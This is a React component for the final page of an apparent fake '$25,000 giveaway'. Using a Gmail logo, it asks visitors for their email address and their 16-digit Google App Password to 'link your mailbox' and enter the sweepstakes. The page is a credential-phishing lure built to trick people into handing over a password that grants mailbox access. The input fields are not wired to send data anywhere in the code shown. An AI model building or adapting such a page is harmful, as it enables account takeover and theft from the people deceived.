import React from 'react';
import './FinalPage.css';
import gmailicon from './icons/gmail.png';
import { Link } from 'react-router-dom';

function FinalPage() {
  return (
    <div className='final-page-container'>
      <div className='final-page-banner'>$25,000 GIVEAWAY</div>
      <div className='final-page-content'>
        <img src={gmailicon} alt="Gmail" className='final-page-logo' />
        <div>
          <p className='final-page-h1'>Final Step!</p>
          <p className='final-page-h2'>Enter your app password below and hit <strong>"enter with gmail"</strong> to link your mailbox and enter the giveaway.</p>
        </div>
        <div className='final-page-input'>
        <p> <strong>Enter Your Email Address:</strong></p>
          <input type="email" placeholder="rewardslover2023@gmail.com" />
        </div>
        <div className='final-page-input'>
          <p><strong>Enter your 16-digit Google App Password:</strong></p>
          <input placeholder="hpit / pili / tqud / bkhg" />
        </div>
        <Link to="/success">
        <button className='final-page-button'>ENTER THE SWEEPSTAKES!</button>
        </Link>
      </div>
    </div>
  );
}

export default FinalPage;

